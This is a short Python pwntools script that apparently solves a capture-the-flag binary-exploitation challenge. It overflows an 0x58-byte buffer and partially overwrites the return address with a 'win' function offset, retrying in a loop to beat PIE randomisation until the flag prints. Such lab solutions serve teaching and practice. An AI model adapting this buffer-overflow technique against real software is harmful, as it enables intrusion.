from pwn import *

buffer_size = 0x58
win_offset = 0x146B

while True:
    io = process(['/challenge/binary-exploitation-pie-overflow'])

    io.recvregex(br'Send your payload.*\n')
    io.send(b'A' * buffer_size + pack(win_offset, 'all'))

    try:
        flag = io.recvregex(br'Here is your flag:\n(.+)\n', capture=True).group(1).decode()
        print(flag)
        break
    except:
        pass

